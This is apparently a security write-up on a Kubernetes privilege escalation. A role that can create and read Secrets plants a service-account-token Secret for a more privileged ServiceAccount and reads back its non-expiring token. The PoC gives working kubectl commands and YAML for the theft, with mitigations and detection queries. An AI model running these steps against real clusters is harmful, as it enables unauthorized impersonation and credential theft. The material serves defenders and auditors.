### Summary
`create` + `get` on Secrets lets a subject take over any ServiceAccount in the namespace: create a `kubernetes.io/service-account-token` Secret naming the target, and Kubernetes writes a non-expiring token for it into the Secret.

### Details
Before Kubernetes 1.24, every ServiceAccount automatically got a Secret holding its token. 1.24 stopped creating them, but the token controller still fills in any Secret of this type, whoever created it. So a "manage Secrets" role is really a "become any ServiceAccount" role.

1. `deploy-bot` is bound to `victim-admin-role` (`*`/`*`/`*` in the namespace).
2. `secret-manager` is bound to `secret-editor`, which only grants access to `secrets`.
3. `secret-manager` plants a token Secret for `deploy-bot` and reads it back.

### PoC
Deploy, and log in as `secret-manager`:
```
$ kubectl apply -f 10-sa-token-secret-plant.yaml
$ export API=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')
$ export TOKEN=$(kubectl -n 10-token-secret-plant create token secret-manager)
```

`secret-manager` can't mint a token for `deploy-bot` directly:
```
$ kubectl --insecure-skip-tls-verify --server=$API --token=$TOKEN --kubeconfig <(echo) create token -n 10-token-secret-plant deploy-bot
error: failed to create token: serviceaccounts "deploy-bot" is forbidden: User "system:serviceaccount:10-token-secret-plant:secret-manager" cannot create resource "serviceaccounts/token" in API group "" in the namespace "10-token-secret-plant"
```

But it can create a token Secret for `deploy-bot` and read it back:
```
$ cat <<'EOF' | kubectl --insecure-skip-tls-verify --server=$API --token=$TOKEN --kubeconfig <(echo) -n 10-token-secret-plant apply -f -
apiVersion: v1
kind: Secret
metadata:
  name: totally-normal-app-secret
  annotations:
    kubernetes.io/service-account.name: deploy-bot
type: kubernetes.io/service-account-token
EOF
secret/totally-normal-app-secret created

$ export STOLEN=$(kubectl --insecure-skip-tls-verify --server=$API --token=$TOKEN --kubeconfig <(echo) -n 10-token-secret-plant get secret totally-normal-app-secret -o jsonpath='{.data.token}' | base64 -d)
```

The stolen token is `deploy-bot`'s, so the same request now succeeds:
```
$ kubectl --insecure-skip-tls-verify --server=$API --token=$STOLEN --kubeconfig <(echo) create token -n 10-token-secret-plant deploy-bot
eyJhbGciOiJSUzI1NiIs...
```

Deleting the Secret invalidates the token.

### Impact
Non-expiring tokens for every ServiceAccount in scope (cluster-wide with a ClusterRoleBinding). `resourceNames` can't make `create` safe, since create requests carry no name. Mitigate by not granting `create` and `get` on Secrets together, or by blocking this Secret type with a ValidatingAdmissionPolicy.

### KuberHound Detection
- `CAN_PLANT_TOKEN_SECRET` (Role → ServiceAccount): the path `secret-manager → secret-editor → deploy-bot → victim-admin-role` is visible before the attack. Saved query: `"KuberHound: Token minting and impersonation of other identities"`.
- `CONTAINS_TOKEN` (Secret → ServiceAccount): marks existing token Secrets. Saved query: `"KuberHound: Readable ServiceAccount token Secrets"`.

### Advisories
Not a CVE, documented behavior: https://kubernetes.io/docs/concepts/configuration/secret/#serviceaccount-token-secrets
